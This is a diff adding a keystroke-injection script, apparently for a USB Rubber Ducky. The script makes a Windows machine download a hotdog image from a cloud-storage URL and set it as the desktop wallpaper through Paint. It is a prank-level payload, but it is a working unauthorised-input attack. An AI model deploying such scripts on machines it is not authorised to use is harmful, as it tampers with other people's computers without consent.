@@ -1,0 +1,34 @@
+DELAY 3000
+GUI r
+DELAY 100
+STRING iexplore http://s3.amazonaws.com/rapgenius/hotdog.jpg
+ENTER
+DELAY 2000
+ALT f
+DELAY 100
+STRING a
+DELAY 100
+STRING %USERPROFILE%\hotdog.jpg
+DELAY 100
+ENTER
+DELAY 100
+CONTROL w
+DELAY 300
+GUI r
+DELAY 100
+STRING  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Paint.lnk
+DELAY 300
+ENTER
+DELAY 500 
+CONTROL o
+DELAY 100
+STRING %USERPROFILE%\hotdog.jpg
+ENTER
+DELAY 300 
+ALT f
+DELAY 100
+STRING b
+DELAY 300 
+ALT f
+DELAY 100
+STRING x
